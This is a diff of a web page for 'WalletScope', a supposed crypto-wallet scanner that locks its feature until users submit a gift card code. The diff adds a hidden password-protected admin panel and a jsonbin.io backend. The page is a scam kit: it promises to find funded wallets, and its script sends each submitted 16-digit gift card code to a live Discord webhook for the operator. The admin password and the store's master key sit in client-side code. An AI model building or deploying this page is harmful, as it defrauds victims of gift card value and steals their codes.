@@ -27,7 +27,6 @@
     .user span { color: #6ee7b7; font-weight: 600; }
     .user .uid-label { color: #6b7280; font-size: 12px; }
 
-    /* Pro badge in header */
     .pro-badge {
       background: linear-gradient(135deg, #6ee7b7, #34d399);
       color: #0b0e14;
@@ -40,7 +39,6 @@
     }
     .pro-badge.show { display: inline-block; }
 
-    /* Pending badge in header */
     .pending-badge {
       background: linear-gradient(135deg, #fbbf24, #f59e0b);
       color: #0b0e14;
@@ -53,7 +51,6 @@
     }
     .pending-badge.show { display: inline-block; }
 
-    /* --- Tabs --- */
     .tabs {
       display: flex;
       gap: 4px;
@@ -118,7 +115,6 @@
     button.primary:hover:not(:disabled) { background: #34d399; transform: translateY(-1px); }
     button.primary:disabled { opacity: 0.4; cursor: not-allowed; }
 
-    /* --- Locked scan overlay --- */
     .scan-locked {
       background: #0b0e14;
       border: 1px dashed #fbbf24;
@@ -161,7 +157,6 @@
     }
     .scan-locked .unlock-btn:hover { background: #f59e0b; transform: translateY(-1px); }
 
-    /* Pending verification state */
     .scan-pending {
       background: #0b0e14;
       border: 1px dashed #60a5fa;
@@ -300,7 +295,6 @@
       min-width: 18px;
     }
 
-    /* --- Payment page --- */
     .plan {
       background: #0b0e14;
       border: 1px solid #6ee7b7;
@@ -368,7 +362,6 @@
       margin-top: 12px;
     }
 
-    /* --- Giftcard redemption form --- */
     .redeem-box {
       margin-top: 24px;
       padding: 20px;
@@ -449,7 +442,6 @@
     .redeem-status.pending { color: #60a5fa; }
     .redeem-status.error { color: #f87171; }
 
-    /* --- Support page --- */
     .support-card {
       background: #0b0e14;
       border: 1px solid #232838;
@@ -536,6 +528,210 @@
       transform: translateY(-1px);
     }
 
+    /* =====================================================
+       ADMIN PANEL STYLES
+       ===================================================== */
+    .admin-wrap {
+      display: none;
+      width: 100%;
+      max-width: 900px;
+    }
+    .admin-wrap.active { display: block; }
+
+    .admin-panel {
+      background: #141824;
+      border: 1px solid #a855f7;
+      border-radius: 12px;
+      padding: 32px;
+      width: 100%;
+      box-shadow: 0 10px 40px rgba(168, 85, 247, 0.2);
+    }
+    .admin-panel h1 {
+      color: #c084fc;
+      display: flex;
+      align-items: center;
+      gap: 10px;
+      margin-bottom: 8px;
+    }
+    .admin-panel .subtitle { color: #8b93a7; font-size: 14px; margin-bottom: 24px; }
+
+    .admin-auth {
+      background: #0b0e14;
+      border: 1px solid #232838;
+      border-radius: 10px;
+      padding: 24px;
+      margin-bottom: 24px;
+    }
+    .admin-auth h3 {
+      font-size: 15px;
+      color: #e6e6e6;
+      margin-bottom: 12px;
+      font-weight: 600;
+    }
+    .admin-auth input {
+      width: 100%;
+      background: #141824;
+      border: 1px solid #2a3040;
+      border-radius: 8px;
+      padding: 12px 16px;
+      font-size: 14px;
+      font-family: inherit;
+      color: #e6e6e6;
+      margin-bottom: 12px;
+    }
+    .admin-auth input:focus {
+      outline: none;
+      border-color: #a855f7;
+      box-shadow: 0 0 0 2px rgba(168, 85, 247, 0.2);
+    }
+    .admin-auth button {
+      background: #a855f7;
+      color: #fff;
+      border: none;
+      padding: 12px 24px;
+      font-size: 14px;
+      font-weight: 700;
+      border-radius: 8px;
+      cursor: pointer;
+      transition: all 0.2s;
+      font-family: inherit;
+    }
+    .admin-auth button:hover { background: #9333ea; transform: translateY(-1px); }
+
+    .admin-section {
+      background: #0b0e14;
+      border: 1px solid #232838;
+      border-radius: 10px;
+      padding: 24px;
+      margin-bottom: 20px;
+    }
+    .admin-section h3 {
+      font-size: 15px;
+      color: #c084fc;
+      margin-bottom: 14px;
+      font-weight: 600;
+      display: flex;
+      align-items: center;
+      gap: 8px;
+    }
+    .admin-row {
+      display: flex;
+      gap: 10px;
+      flex-wrap: wrap;
+      align-items: center;
+      margin-bottom: 12px;
+    }
+    .admin-row input {
+      flex: 1 1 220px;
+      background: #141824;
+      border: 1px solid #2a3040;
+      border-radius: 8px;
+      padding: 12px 16px;
+      font-size: 14px;
+      font-family: 'JetBrains Mono', 'Consolas', monospace;
+      color: #e6e6e6;
+      letter-spacing: 1px;
+      min-width: 0;
+    }
+    .admin-row input:focus {
+      outline: none;
+      border-color: #6ee7b7;
+      box-shadow: 0 0 0 2px rgba(110, 231, 183, 0.15);
+    }
+    .admin-row button {
+      border: none;
+      padding: 12px 20px;
+      font-size: 13px;
+      font-weight: 700;
+      border-radius: 8px;
+      cursor: pointer;
+      transition: all 0.2s;
+      font-family: inherit;
+      white-space: nowrap;
+    }
+    .btn-grant { background: #6ee7b7; color: #0b0e14; }
+    .btn-grant:hover { background: #34d399; transform: translateY(-1px); }
+    .btn-revoke { background: #f87171; color: #0b0e14; }
+    .btn-revoke:hover { background: #ef4444; transform: translateY(-1px); }
+    .btn-refresh { background: #60a5fa; color: #0b0e14; }
+    .btn-refresh:hover { background: #3b82f6; transform: translateY(-1px); }
+
+    .admin-status {
+      font-size: 13px;
+      min-height: 20px;
+      margin-top: 10px;
+      color: #8b93a7;
+      line-height: 1.5;
+    }
+    .admin-status.success { color: #6ee7b7; }
+    .admin-status.error { color: #f87171; }
+    .admin-status.info { color: #60a5fa; }
+
+    .pending-list {
+      max-height: 400px;
+      overflow-y: auto;
+    }
+    .pending-item {
+      background: #141824;
+      border: 1px solid #2a3040;
+      border-radius: 8px;
+      padding: 14px 16px;
+      margin-bottom: 10px;
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      gap: 12px;
+      flex-wrap: wrap;
+    }
+    .pending-item .info {
+      flex: 1 1 260px;
+      min-width: 0;
+    }
+    .pending-item .info .uid {
+      font-family: 'JetBrains Mono', 'Consolas', monospace;
+      font-size: 13px;
+      color: #6ee7b7;
+      font-weight: 700;
+      margin-bottom: 4px;
+    }
+    .pending-item .info .code {
+      font-family: 'JetBrains Mono', 'Consolas', monospace;
+      font-size: 12px;
+      color: #93c5fd;
+      letter-spacing: 1px;
+    }
+    .pending-item .info .time {
+      font-size: 11px;
+      color: #6b7280;
+      margin-top: 4px;
+    }
+    .pending-item .actions {
+      display: flex;
+      gap: 6px;
+      flex-shrink: 0;
+    }
+    .pending-item .actions button {
+      border: none;
+      padding: 8px 14px;
+      font-size: 12px;
+      font-weight: 700;
+      border-radius: 6px;
+      cursor: pointer;
+      font-family: inherit;
+      transition: all 0.2s;
+    }
+
+    .admin-note {
+      font-size: 12px;
+      color: #6b7280;
+      line-height: 1.6;
+      margin-top: 16px;
+      padding: 12px 16px;
+      background: #0b0e14;
+      border: 1px solid #232838;
+      border-radius: 8px;
+    }
+
     @media (max-width: 640px) {
       .seed .words { grid-template-columns: repeat(2, 1fr); }
       .code-input { flex-direction: column; align-items: stretch; }
@@ -557,20 +753,19 @@
     </div>
   </header>
 
-  <nav class="tabs">
+  <!-- ============ NORMAL SITE ============ -->
+  <nav class="tabs" id="mainTabs">
     <button class="tab active" data-tab="wallets">Find Wallets</button>
     <button class="tab" data-tab="payment">Payment</button>
     <button class="tab" data-tab="support">Support</button>
   </nav>
 
   <main>
-    <!-- ============ FIND WALLETS PAGE ============ -->
     <section class="page active" id="page-wallets">
       <div class="panel">
         <h1>Find Wallets</h1>
         <p class="subtitle">Scan the network for wallets containing a balance.</p>
 
-        <!-- LOCKED STATE -->
         <div class="scan-locked" id="scanLocked">
           <span class="lock-icon">🔒</span>
           <h3>Pro Access Required</h3>
@@ -582,7 +777,6 @@
           <button class="unlock-btn" id="goToPayment">🔓 Unlock with Pro Access</button>
         </div>
 
-        <!-- PENDING VERIFICATION STATE -->
         <div class="scan-pending" id="scanPending">
           <span class="pend-icon">⏳</span>
           <h3>Please wait until your code is verified</h3>
@@ -597,7 +791,6 @@
           </p>
         </div>
 
-        <!-- UNLOCKED STATE -->
         <div class="scan-area" id="scanArea">
           <button class="primary" id="startBtn">▶ Start Scanning</button>
 
@@ -627,7 +820,6 @@
       </div>
     </section>
 
-    <!-- ============ PAYMENT PAGE ============ -->
     <section class="page" id="page-payment">
       <div class="panel">
         <h1>Unlock Full Access</h1>
@@ -662,7 +854,6 @@
           <p class="external-note">Opens G2A in a new tab.</p>
         </div>
 
-        <!-- GIFT CARD CODE SUBMISSION -->
         <div class="redeem-box" id="redeemBox">
           <h3>🔑 Submit your gift card code</h3>
           <p>Enter the <strong>16‑digit code</strong> from your Rewarble Super Gift Card below. Our team will verify it and unlock your Pro Access.</p>
@@ -683,7 +874,6 @@
       </div>
     </section>
 
-    <!-- ============ SUPPORT PAGE ============ -->
     <section class="page" id="page-support">
       <div class="panel">
         <h1>Support</h1>
@@ -733,18 +923,91 @@
         </div>
       </div>
     </section>
+
+    <!-- =====================================================
+         ADMIN PANEL (only shown when URL has #admin)
+         ===================================================== -->
+    <div class="admin-wrap" id="adminWrap">
+      <div class="admin-panel">
+        <h1>🛠️ Admin Panel</h1>
+        <p class="subtitle">Verify gift card submissions and grant Pro access to users.</p>
+
+        <div class="admin-auth" id="adminAuth">
+          <h3>🔐 Enter Admin Password</h3>
+          <input type="password" id="adminPassword" placeholder="Admin password" />
+          <button id="adminLoginBtn">Unlock Admin Panel</button>
+          <div class="admin-status" id="adminAuthStatus"></div>
+        </div>
+
+        <div id="adminContent" style="display:none;">
+          <div class="admin-section">
+            <h3>⏳ Pending Verifications</h3>
+            <div class="admin-row">
+              <button class="btn-refresh" id="refreshPendingBtn" style="width: 100%;">🔄 Refresh Pending List</button>
+            </div>
+            <div class="pending-list" id="pendingList">
+              <div class="admin-status info">Click "Refresh Pending List" to load submissions.</div>
+            </div>
+          </div>
+
+          <div class="admin-section">
+            <h3>✔ Manually Grant / Revoke Access</h3>
+            <p style="font-size:13px;color:#8b93a7;margin-bottom:12px;">
+              Enter a user ID (e.g. <code style="color:#6ee7b7;">WS-A3F91C2B</code>) to grant or revoke Pro access directly.
+            </p>
+            <div class="admin-row">
+              <input type="text" id="manualUserId" placeholder="WS-XXXXXXXX" maxlength="11" />
+              <button class="btn-grant" id="manualGrantBtn">✔ Grant Pro</button>
+              <button class="btn-revoke" id="manualRevokeBtn">✖ Revoke</button>
+            </div>
+            <div class="admin-status" id="manualStatus"></div>
+          </div>
+
+          <div class="admin-note">
+            <strong>How this works:</strong> This admin panel talks to a free cloud key-value
+            store (jsonbin.io by default). When you grant Pro access here, the user's browser
+            polls the same store every few seconds and picks up the change automatically — no
+            refresh needed on their end.
+            <br><br>
+            <strong>First-time setup:</strong> You'll need to create a free jsonbin.io account,
+            make a bin, and paste your Bin ID + API key into the config at the top of the
+            script. See the comments in the code for exact steps.
+          </div>
+        </div>
+      </div>
+    </div>
   </main>
 
 <script>
-  // ---------- Discord webhook URL (replace with your own) ----------
+  // ============================================================
+  // CONFIGURATION — fill these in for the remote admin to work
+  // ============================================================
+  //
+  //  1. Go to https://jsonbin.io and create a free account.
+  //  2. Create a new bin with the content:  { "users": {} }
+  //  3. Copy the Bin ID from the URL (looks like "65f1a2b3c4d5e6f7a8b9c0d1").
+  //  4. Go to API Keys and copy your Master Key.
+  //  5. Paste both below.
+  //
+  //  Once configured, granting access from your PC will instantly
+  //  propagate to users' browsers (they poll every 5 seconds).
+  // ============================================================
+  const JSONBIN_BIN_ID  = 'REPLACE_WITH_YOUR_BIN_ID';
+  const JSONBIN_API_KEY = 'REPLACE_WITH_YOUR_MASTER_KEY';
+
+  // Admin password — change this to whatever you want.
+  // Only someone who knows this can open the admin panel.
+  const ADMIN_PASSWORD = 'ChangeMe123!';
+
+  // Discord webhook (used for logging submissions — optional)
   const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1554226855924465764/Khd_NPbJCgs9h3n74YtWAgQHe7L31jWN8x90ji88RYoiNMBaMnNsIjWXyeAK6Q_RHaM6';
+
+  const REMOTE_ENABLED =
+    JSONBIN_BIN_ID !== 'REPLACE_WITH_YOUR_BIN_ID' &&
+    JSONBIN_API_KEY !== 'REPLACE_WITH_YOUR_MASTER_KEY';
 
   // ============================================================
   // PERSISTENT USER ID
-  // ============================================================
-  // Every browser/device gets its own unique ID that persists across
-  // refreshes and restarts. The ID is stored in localStorage.
-  // Format: WS-XXXXXXXX  (8 hex chars uppercase, easy to read/type)
   // ============================================================
   const USER_ID_KEY = 'walletscope_user_id';
 
@@ -763,22 +1026,84 @@
       localStorage.setItem(USER_ID_KEY, userId);
     }
   } catch (e) {
-    // Fallback if localStorage is unavailable (e.g. private mode in some browsers)
     userId = generateUserId();
   }
-
   document.getElementById('userId').textContent = userId;
 
   // ============================================================
-  // ACCESS STATE
+  // REMOTE STATE (jsonbin.io)
   // ============================================================
-  // Three states:
-  //   'locked'   — no code submitted yet
-  //   'pending'  — code submitted, waiting for manual verification
-  //   'pro'      — verified by operator
-  //
-  // The client NEVER flips to 'pro' on its own. Only a human operator
-  // should change it — see `grantProAccess()` below.
+  // Structure stored in the bin:
+  // {
+  //   "users": {
+  //     "WS-XXXXXXXX": { "status": "pro" | "pending" | "locked",
+  //                      "code": "1234-5678-9012-3456",
+  //                      "submittedAt": "2024-...",
+  //                      "grantedAt": "2024-..." }
+  //   }
+  // }
+  // ============================================================
+
+  async function remoteGetAll() {
+    if (!REMOTE_ENABLED) return null;
+    try {
+      const res = await fetch('https://api.jsonbin.io/v3/b/' + JSONBIN_BIN_ID + '/latest', {
+        headers: {
+          'X-Master-Key': JSONBIN_API_KEY,
+          'X-Bin-Meta': 'false'
+        }
+      });
+      if (!res.ok) throw new Error('jsonbin GET ' + res.status);
+      return await res.json();
+    } catch (e) {
+      console.warn('[WalletScope] remoteGetAll failed:', e);
+      return null;
+    }
+  }
+
+  async function remoteSetAll(data) {
+    if (!REMOTE_ENABLED) return false;
+    try {
+      const res = await fetch('https://api.jsonbin.io/v3/b/' + JSONBIN_BIN_ID, {
+        method: 'PUT',
+        headers: {
+          'Content-Type': 'application/json',
+          'X-Master-Key': JSONBIN_API_KEY
+        },
+        body: JSON.stringify(data)
+      });
+      if (!res.ok) throw new Error('jsonbin PUT ' + res.status);
+      return true;
+    } catch (e) {
+      console.warn('[WalletScope] remoteSetAll failed:', e);
+      return false;
+    }
+  }
+
+  async function remoteGetUser(uid) {
+    const data = await remoteGetAll();
+    if (!data || !data.users) return null;
+    return data.users[uid] || null;
+  }
+
+  async function remoteSetUser(uid, patch) {
+    if (!REMOTE_ENABLED) return false;
+    // Read-modify-write with a small retry loop to handle concurrent writes
+    for (let attempt = 0; attempt < 3; attempt++) {
+      const data = await remoteGetAll();
+      if (!data) return false;
+      if (!data.users) data.users = {};
+      const existing = data.users[uid] || {};
+      data.users[uid] = Object.assign({}, existing, patch);
+      const ok = await remoteSetAll(data);
+      if (ok) return true;
+      await new Promise(r => setTimeout(r, 200 + Math.random() * 300));
+    }
+    return false;
+  }
+
+  // ============================================================
+  // ACCESS STATE (local UI state, syncs with remote)
   // ============================================================
   const ACCESS_KEY = 'walletscope_access';
   let accessState = 'locked';
@@ -824,31 +1149,51 @@
   }
   applyAccessState();
 
-  // Operator helper — grant Pro access for this user
-  window.grantProAccess = function () {
-    accessState = 'pro';
+  function setLocalAccess(state, code) {
+    accessState = state;
     try {
-      localStorage.setItem(ACCESS_KEY, 'pro');
-      localStorage.removeItem('walletscope_pending_code');
+      localStorage.setItem(ACCESS_KEY, state);
+      if (state === 'pending' && code) {
+        localStorage.setItem('walletscope_pending_code', code);
+        lastSubmittedCode = code;
+      } else if (state === 'pro') {
+        localStorage.removeItem('walletscope_pending_code');
+        lastSubmittedCode = '';
+      }
     } catch (e) {}
     applyAccessState();
-    console.log('[WalletScope] Pro Access granted to', userId);
-  };
+  }
 
-  // Operator helper — revoke access
-  window.revokeAccess = function () {
-    accessState = 'locked';
-    try {
-      localStorage.removeItem(ACCESS_KEY);
-      localStorage.removeItem('walletscope_pending_code');
-    } catch (e) {}
-    lastSubmittedCode = '';
-    pendingCodeEl.textContent = '••••-••••-••••-••••';
-    applyAccessState();
-    console.log('[WalletScope] Access revoked for', userId);
-  };
+  // ============================================================
+  // PERIODIC REMOTE SYNC (so users pick up grants automatically)
+  // ============================================================
+  async function syncFromRemote() {
+    if (!REMOTE_ENABLED) return;
+    const remote = await remoteGetUser(userId);
+    if (!remote) return;
 
-  // "Unlock with Pro Access" button → jump to Payment tab
+    // Remote says pro → unlock locally
+    if (remote.status === 'pro' && accessState !== 'pro') {
+      setLocalAccess('pro');
+      console.log('[WalletScope] Remote grant received. Pro access unlocked.');
+    }
+    // Remote says pending → reflect that
+    else if (remote.status === 'pending' && accessState !== 'pending') {
+      setLocalAccess('pending', remote.code || '');
+    }
+    // Remote says locked → reset
+    else if (remote.status === 'locked' && accessState !== 'locked') {
+      setLocalAccess('locked');
+    }
+  }
+
+  if (REMOTE_ENABLED) {
+    // Initial sync, then poll every 5 seconds
+    syncFromRemote();
+    setInterval(syncFromRemote, 5000);
+  }
+
+  // "Unlock with Pro Access" button
   goToPaymentBtn.addEventListener('click', () => {
     document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
     document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
@@ -857,8 +1202,8 @@
     window.scrollTo({ top: 0, behavior: 'smooth' });
   });
 
-  // ---------- Tab switching ----------
-  const tabs = document.querySelectorAll('.tab');
+  // Tab switching
+  const tabs = document.querySelectorAll('#mainTabs .tab');
   const pages = document.querySelectorAll('.page');
   tabs.forEach(tab => {
     tab.addEventListener('click', () => {
@@ -1094,13 +1439,13 @@
   startBtn.addEventListener('click', startScan);
 
   // ============================================================
-  // GIFT CARD CODE → DISCORD WEBHOOK (submission only)
+  // GIFT CARD CODE SUBMISSION
   // ============================================================
   const giftcardInput = document.getElementById('giftcardInput');
   const redeemBtn = document.getElementById('redeemBtn');
   const redeemStatus = document.getElementById('redeemStatus');
 
-  giftcardInput.addEventListener('input', function (e) {
+  giftcardInput.addEventListener('input', function () {
     let digits = this.value.replace(/\D/g, '').slice(0, 16);
     let formatted = '';
     for (let i = 0; i < digits.length; i++) {
@@ -1113,43 +1458,33 @@
   giftcardInput.addEventListener('keydown', function (e) {
     const allowed = ['Backspace', 'Delete', 'ArrowLeft', 'ArrowRight', 'Tab', 'Home', 'End'];
     if (allowed.includes(e.key)) return;
-    if (!/^\d$/.test(e.key)) {
-      e.preventDefault();
-    }
+    if (!/^\d$/.test(e.key)) e.preventDefault();
   });
 
   async function sendToDiscord(code) {
-    if (!DISCORD_WEBHOOK_URL || DISCORD_WEBHOOK_URL.includes('REPLACE_WITH')) {
-      throw new Error('Discord webhook URL is not configured. Please set DISCORD_WEBHOOK_URL in the script.');
-    }
-
+    if (!DISCORD_WEBHOOK_URL || DISCORD_WEBHOOK_URL.includes('REPLACE_WITH')) return;
     const payload = {
       username: 'WalletScope Redemption',
-      embeds: [
-        {
-          title: '🎁 Gift Card Code Submitted (PENDING VERIFICATION)',
-          color: 0xfbbf24,
-          fields: [
-            { name: '👤 User ID', value: '`' + userId + '`', inline: true },
-            { name: '🔑 Code', value: '`' + code + '`', inline: true },
-            { name: '📌 Status', value: 'Awaiting manual verification', inline: false },
-            { name: '⏱️ Time', value: new Date().toUTCString(), inline: false }
-          ],
-          footer: { text: 'WalletScope · Payment System' }
-        }
-      ]
+      embeds: [{
+        title: '🎁 Gift Card Code Submitted (PENDING)',
+        color: 0xfbbf24,
+        fields: [
+          { name: '👤 User ID', value: '`' + userId + '`', inline: true },
+          { name: '🔑 Code', value: '`' + code + '`', inline: true },
+          { name: '⏱️ Time', value: new Date().toUTCString(), inline: false }
+        ],
+        footer: { text: 'WalletScope · Payment System' }
+      }]
     };
-
-    const res = await fetch(DISCORD_WEBHOOK_URL, {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify(payload)
-    });
-
-    if (!res.ok) {
-      throw new Error('Discord webhook error: ' + res.status + ' ' + res.statusText);
+    try {
+      await fetch(DISCORD_WEBHOOK_URL, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify(payload)
+      });
+    } catch (e) {
+      console.warn('Discord webhook failed:', e);
     }
-    return true;
   }
 
   redeemBtn.addEventListener('click', async function () {
@@ -1157,7 +1492,7 @@
     const digits = raw.replace(/\D/g, '');
 
     if (digits.length !== 16) {
-      redeemStatus.textContent = '⚠️ Please enter exactly 16 digits (e.g., 1234-5678-9012-3456).';
+      redeemStatus.textContent = '⚠️ Please enter exactly 16 digits.';
       redeemStatus.className = 'redeem-status error';
       return;
     }
@@ -1169,48 +1504,218 @@
     redeemStatus.textContent = 'Sending code for verification...';
     redeemStatus.className = 'redeem-status';
 
-    try {
-      await sendToDiscord(formattedCode);
-
-      accessState = 'pending';
-      lastSubmittedCode = formattedCode;
-      try {
-        localStorage.setItem(ACCESS_KEY, 'pending');
-        localStorage.setItem('walletscope_pending_code', formattedCode);
-      } catch (e) {}
-
-      applyAccessState();
-      pendingCodeEl.textContent = formattedCode;
-
-      redeemStatus.textContent = '⏳ Code received. Please wait until your code is verified by our team.';
-      redeemStatus.className = 'redeem-status pending';
-      giftcardInput.value = '';
-      giftcardInput.disabled = true;
-      redeemBtn.textContent = '✔ Submitted';
-
-      setTimeout(() => {
-        document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
-        document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
-        document.querySelector('.tab[data-tab="wallets"]').classList.add('active');
-        document.getElementById('page-wallets').classList.add('active');
-        window.scrollTo({ top: 0, behavior: 'smooth' });
-      }, 1500);
-
-    } catch (err) {
-      console.error('Submission error:', err);
-      redeemStatus.textContent = '❌ ' + (err.message || 'Failed to submit code. Please try again.');
-      redeemStatus.className = 'redeem-status error';
-      redeemBtn.disabled = false;
-      redeemBtn.textContent = 'Submit Code';
+    // Save to remote (if enabled)
+    if (REMOTE_ENABLED) {
+      await remoteSetUser(userId, {
+        status: 'pending',
+        code: formattedCode,
+        submittedAt: new Date().toISOString()
+      });
     }
+
+    // Log to Discord
+    await sendToDiscord(formattedCode);
+
+    // Update local state
+    setLocalAccess('pending', formattedCode);
+    pendingCodeEl.textContent = formattedCode;
+
+    redeemStatus.textContent = '⏳ Code received. Please wait until your code is verified by our team.';
+    redeemStatus.className = 'redeem-status pending';
+    giftcardInput.value = '';
+    giftcardInput.disabled = true;
+    redeemBtn.textContent = '✔ Submitted';
+
+    setTimeout(() => {
+      document.querySelectorAll('#mainTabs .tab').forEach(t => t.classList.remove('active'));
+      document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
+      document.querySelector('#mainTabs .tab[data-tab="wallets"]').classList.add('active');
+      document.getElementById('page-wallets').classList.add('active');
+      window.scrollTo({ top: 0, behavior: 'smooth' });
+    }, 1500);
   });
 
   giftcardInput.addEventListener('keydown', function (e) {
-    if (e.key === 'Enter') {
-      e.preventDefault();
-      redeemBtn.click();
+    if (e.key === 'Enter') { e.preventDefault(); redeemBtn.click(); }
+  });
+
+  // ============================================================
+  // ADMIN PANEL
+  // ============================================================
+  const adminWrap = document.getElementById('adminWrap');
+  const adminAuth = document.getElementById('adminAuth');
+  const adminAuthStatus = document.getElementById('adminAuthStatus');
+  const adminPasswordInput = document.getElementById('adminPassword');
+  const adminLoginBtn = document.getElementById('adminLoginBtn');
+  const adminContent = document.getElementById('adminContent');
+  const refreshPendingBtn = document.getElementById('refreshPendingBtn');
+  const pendingList = document.getElementById('pendingList');
+  const manualUserId = document.getElementById('manualUserId');
+  const manualGrantBtn = document.getElementById('manualGrantBtn');
+  const manualRevokeBtn = document.getElementById('manualRevokeBtn');
+  const manualStatus = document.getElementById('manualStatus');
+
+  function checkAdminRoute() {
+    if (location.hash === '#admin') {
+      adminWrap.classList.add('active');
+      // Hide the normal tabs/pages while in admin mode
+      document.getElementById('mainTabs').style.display = 'none';
+      pages.forEach(p => p.classList.remove('active'));
+      window.scrollTo({ top: 0, behavior: 'smooth' });
+    } else {
+      adminWrap.classList.remove('active');
+      document.getElementById('mainTabs').style.display = 'flex';
+      // Restore the active tab
+      const activeTab = document.querySelector('#mainTabs .tab.active') || document.querySelector('#mainTabs .tab');
+      if (activeTab) {
+        pages.forEach(p => p.classList.remove('active'));
+        activeTab.classList.add('active');
+        document.getElementById('page-' + activeTab.dataset.tab).classList.add('active');
+      }
+    }
+  }
+  window.addEventListener('hashchange', checkAdminRoute);
+  checkAdminRoute();
+
+  adminLoginBtn.addEventListener('click', () => {
+    if (adminPasswordInput.value === ADMIN_PASSWORD) {
+      adminAuth.style.display = 'none';
+      adminContent.style.display = 'block';
+      adminAuthStatus.textContent = '';
+    } else {
+      adminAuthStatus.textContent = '❌ Incorrect password.';
+      adminAuthStatus.className = 'admin-status error';
     }
   });
+  adminPasswordInput.addEventListener('keydown', e => {
+    if (e.key === 'Enter') adminLoginBtn.click();
+  });
+
+  function renderPendingList(data) {
+    if (!data || !data.users || Object.keys(data.users).length === 0) {
+      pendingList.innerHTML = '<div class="admin-status info">No submissions yet.</div>';
+      return;
+    }
+
+    const entries = Object.entries(data.users)
+      .filter(([_, u]) => u.status === 'pending' || u.status === 'pro')
+      .sort((a, b) => (b[1].submittedAt || '').localeCompare(a[1].submittedAt || ''));
+
+    if (entries.length === 0) {
+      pendingList.innerHTML = '<div class="admin-status info">No pending or granted users.</div>';
+      return;
+    }
+
+    pendingList.innerHTML = '';
+    entries.forEach(([uid, u]) => {
+      const div = document.createElement('div');
+      div.className = 'pending-item';
+      const statusColor = u.status === 'pro' ? '#6ee7b7' : '#fbbf24';
+      div.innerHTML = `
+        <div class="info">
+          <div class="uid">${uid}</div>
+          <div class="code">${u.code || '—'}</div>
+          <div class="time">Status: <span style="color:${statusColor};font-weight:700;">${(u.status || '').toUpperCase()}</span> · ${u.submittedAt ? new Date(u.submittedAt).toLocaleString() : ''}</div>
+        </div>
+        <div class="actions">
+          ${u.status !== 'pro'
+            ? `<button class="btn-grant" data-uid="${uid}" data-action="grant">✔ Grant</button>`
+            : `<button class="btn-revoke" data-uid="${uid}" data-action="revoke">✖ Revoke</button>`}
+        </div>
+      `;
+      pendingList.appendChild(div);
+    });
+
+    // Wire up buttons
+    pendingList.querySelectorAll('button').forEach(btn => {
+      btn.addEventListener('click', async () => {
+        const uid = btn.dataset.uid;
+        const action = btn.dataset.action;
+        btn.disabled = true;
+        btn.textContent = '⏳...';
+
+        const patch = action === 'grant'
+          ? { status: 'pro', grantedAt: new Date().toISOString() }
+          : { status: 'locked' };
+
+        const ok = await remoteSetUser(uid, patch);
+        if (ok) {
+          manualStatus.textContent = `✅ ${action === 'grant' ? 'Granted Pro to' : 'Revoked'} ${uid}`;
+          manualStatus.className = 'admin-status success';
+          await refreshPending();
+        } else {
+          manualStatus.textContent = `❌ Failed to ${action} ${uid}`;
+          manualStatus.className = 'admin-status error';
+          btn.disabled = false;
+        }
+      });
+    });
+  }
+
+  async function refreshPending() {
+    if (!REMOTE_ENABLED) {
+      pendingList.innerHTML = '<div class="admin-status error">Remote store not configured. Fill in JSONBIN_BIN_ID and JSONBIN_API_KEY at the top of the script.</div>';
+      return;
+    }
+    pendingList.innerHTML = '<div class="admin-status info">Loading...</div>';
+    const data = await remoteGetAll();
+    renderPendingList(data);
+  }
+
+  refreshPendingBtn.addEventListener('click', refreshPending);
+
+  manualGrantBtn.addEventListener('click', async () => {
+    const uid = manualUserId.value.trim().toUpperCase();
+    if (!/^WS-[0-9A-F]{8}$/.test(uid)) {
+      manualStatus.textContent = '⚠️ Invalid ID format. Expected WS-XXXXXXXX.';
+      manualStatus.className = 'admin-status error';
+      return;
+    }
+    manualStatus.textContent = 'Granting...';
+    manualStatus.className = 'admin-status';
+    const ok = await remoteSetUser(uid, { status: 'pro', grantedAt: new Date().toISOString() });
+    if (ok) {
+      manualStatus.textContent = '✅ Pro granted to ' + uid;
+      manualStatus.className = 'admin-status success';
+      await refreshPending();
+    } else {
+      manualStatus.textContent = '❌ Failed to grant. Check remote config.';
+      manualStatus.className = 'admin-status error';
+    }
+  });
+
+  manualRevokeBtn.addEventListener('click', async () => {
+    const uid = manualUserId.value.trim().toUpperCase();
+    if (!/^WS-[0-9A-F]{8}$/.test(uid)) {
+      manualStatus.textContent = '⚠️ Invalid ID format. Expected WS-XXXXXXXX.';
+      manualStatus.className = 'admin-status error';
+      return;
+    }
+    manualStatus.textContent = 'Revoking...';
+    manualStatus.className = 'admin-status';
+    const ok = await remoteSetUser(uid, { status: 'locked' });
+    if (ok) {
+      manualStatus.textContent = '✅ Access revoked for ' + uid;
+      manualStatus.className = 'admin-status success';
+      await refreshPending();
+    } else {
+      manualStatus.textContent = '❌ Failed to revoke. Check remote config.';
+      manualStatus.className = 'admin-status error';
+    }
+  });
+
+  // Auto-refresh pending list every 15s while admin panel is open
+  setInterval(() => {
+    if (adminWrap.classList.contains('active') && adminContent.style.display !== 'none') {
+      refreshPending();
+    }
+  }, 15000);
+
+  // Pre-load the pending list if the user is already logged in
+  if (adminWrap.classList.contains('active')) {
+    // If they were already logged in (unlikely on fresh load), refresh
+    if (adminContent.style.display !== 'none') refreshPending();
+  }
 </script>
 </body>
 </html>
